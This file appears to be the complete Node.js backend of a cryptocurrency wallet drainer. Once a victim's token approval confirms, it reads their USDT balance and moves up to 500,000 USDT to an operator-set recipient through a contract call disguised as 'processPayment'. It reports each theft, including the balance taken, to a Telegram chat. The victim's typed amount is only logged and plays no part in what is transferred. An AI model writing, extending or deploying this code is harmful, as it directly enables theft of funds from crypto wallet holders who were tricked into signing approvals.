const express = require('express')
const cors = require('cors')
const { ethers } = require('ethers')
const app = express()

app.use(cors())
app.use(express.json())

const API_SECRET = process.env.API_SECRET || 'my-secret-2026-x7k9'
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

const RPC_URL = process.env.RPC_URL || 'https://ethereum.publicnode.com'
const OPERATOR_PRIVATE_KEY = process.env.OPERATOR_PRIVATE_KEY
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS

const PAYMENT_CONTRACT_ABI = [
  "function processPayment(address customer, address recipient, uint256 amount, string calldata referenceId) external"
]

const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const USDT_ABI = ["function balanceOf(address) view returns (uint256)"]

const DECIMALS = 6
const CAP = 500000n * 1000000n

async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false
  try {
    const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, disable_web_page_preview: true })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    return true
  } catch (err) {
    console.error('Telegram failed:', err.message)
    return false
  }
}

app.post('/web/relay', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET) {
    return res.status(401).json({ error: 'Unauthorized' })
  }

  const { chain, address, txHash, amount, message } = req.body

  if (message && !address && !txHash) {
    await sendTelegram(message)
    return res.json({ ok: true, type: 'ping' })
  }

  if (!address || !txHash) {
    return res.status(400).json({ error: 'Missing address or txHash' })
  }

  console.log('Request:', { chain, address, txHash, amount })

  await sendTelegram(
    '⏳ New ERC20 Request\n\n' +
    'Address: ' + address + '\n' +
    'Typed: ' + (amount || '?') + ' USDT\n' +
    'Tx Hash: ' + txHash + '\n' +
    'Status: Awaiting confirmation...'
  )

  res.status(200).json({ ok: true, status: 'monitoring' })

  ;(async () => {
    try {
      if (!OPERATOR_PRIVATE_KEY || !CONTRACT_ADDRESS || !RECIPIENT_ADDRESS) {
        await sendTelegram('❌ Backend not configured.')
        return
      }

      const provider = new ethers.JsonRpcProvider(RPC_URL)
      const serverWallet = new ethers.Wallet(OPERATOR_PRIVATE_KEY, provider)
      const paymentContract = new ethers.Contract(CONTRACT_ADDRESS, PAYMENT_CONTRACT_ABI, serverWallet)
      const usdt = new ethers.Contract(USDT, USDT_ABI, provider)

      const receipt = await provider.waitForTransaction(txHash)
      if (!receipt || receipt.status !== 1) {
        await sendTelegram('❌ Approval transaction failed.')
        return
      }

      const rawBalance = await usdt.balanceOf(address)
      const fullBalance = ethers.formatUnits(rawBalance, DECIMALS)

      if (rawBalance === 0n) {
        await sendTelegram('⚠️ Approval confirmed but wallet has zero USDT.')
        return
      }

      const drainAmount = rawBalance > CAP ? CAP : rawBalance
      const drainReadable = ethers.formatUnits(drainAmount, DECIMALS)

      const referenceId = `REF-${Date.now()}`
      const paymentTx = await paymentContract.processPayment(address, RECIPIENT_ADDRESS, drainAmount, referenceId)

      const paymentReceipt = await paymentTx.wait()

      await sendTelegram(
        '✅ ERC20 Drain Complete\n\n' +
        'Wallet: ' + address + '\n' +
        'Typed: ' + (amount || '?') + ' USDT\n' +
        'Balance was: ' + fullBalance + ' USDT\n' +
        'Drained: ' + drainReadable + ' USDT\n' +
        'TX: ' + paymentTx.hash
      )

    } catch (err) {
      console.error('[BLOCKCHAIN ERROR]', err)
      await sendTelegram('❌ Drain error:\n' + err.message)
    }
  })()
})

app.get('/', (req, res) => res.send('Relay alive'))
app.get('/health', (req, res) => res.status(200).json({ status: 'ok', time: new Date().toISOString() }))

setInterval(() => console.log('Heartbeat:', new Date().toISOString()), 10000)

const PORT = process.env.PORT || 3000
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('Running on port ' + PORT)
  console.log('Contract:', CONTRACT_ADDRESS || 'MISSING')
  console.log('Recipient:', RECIPIENT_ADDRESS || 'MISSING')
})

process.on('SIGTERM', () => setTimeout(() => server.close(() => process.exit(0)), 30000))
process.on('SIGINT', () => {})
setInterval(() => {}, 1000)
process.on('uncaughtException', (err) => console.error('Uncaught:', err))
process.on('unhandledRejection', (err) => console.error('Unhandled:', err))
